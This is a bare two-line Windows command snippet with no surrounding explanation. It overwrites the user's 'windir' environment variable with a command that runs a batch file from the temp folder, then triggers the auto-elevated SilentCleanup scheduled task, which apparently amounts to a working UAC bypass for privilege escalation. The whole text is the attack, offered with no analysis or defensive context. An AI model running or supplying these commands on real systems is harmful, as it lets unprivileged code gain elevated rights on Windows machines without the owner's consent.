New-ItemProperty "HKCU:\Environment" -Name "windir" -Value "cmd.exe /c start %userprofile%\appdata\local\temp\Bpass.bat REM" -PropertyType String -Force
schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
